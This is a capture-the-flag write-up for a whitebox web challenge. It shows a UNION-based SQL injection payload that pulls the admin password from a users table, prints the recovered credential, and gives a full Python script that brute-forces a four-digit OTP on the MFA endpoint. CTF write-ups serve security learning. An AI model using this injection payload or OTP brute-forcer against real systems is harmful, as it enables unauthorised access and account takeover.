First of all, we check the code (since it's whitebox) and find out three point :

- First, There is a login page.

- Second, there is a `/search` endpoint.

- Third, we need to have `Allowed-IPs: localhost` header to access it. 

After checking the endpoint we can see that it's vulnerable to a SQLI since the input is not sanatize and use to query the db.

With some `UNION` check we can see that the db has 3 column. So we can craft our payload to extract admin password :

`' UNION SELECT username, username, password FROM users--`

This gave us :

`admin:f!hLRXozzFhP3hM?`

But to connect we have to give an OTP code. After analysing the code we can see that the code is only 4 number and last for 4 minutes. We can try to bruteforce it in that window :

```python
import requests
import time
import random

url = "https://crackthegate.insomnihack.ch/mfa"
session_cookie = "eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJtZmFfdmVyaWZpZWQiOmZhbHNlfQ.Z9ShWw.70sH83N0yCkaw4wlca-dSVu_0wY"
headers = {
    "Cookie": f"session={session_cookie}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
}

def brute_force_totp():
    while True:
        code = random.randint(0,9999) # take a random number
        totp_code = str(code).zfill(4)  # format to 4 numbers

        data = {
            "totp_code": totp_code
        }

        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 302 and "dashboard" in response.headers.get("Location", ""):
            print(f"[+] Code TOTP valide trouvé : {totp_code}")
            break
        elif "Invalid TOTP code" in response.text:
            print(f"[-] Code incorrect : {totp_code}")
        else:
            print(f"[!] Réponse inattendue : {response.status_code} pour {totp_code}")

brute_force_totp()
```

With some luck it worked, and we can get the flag.
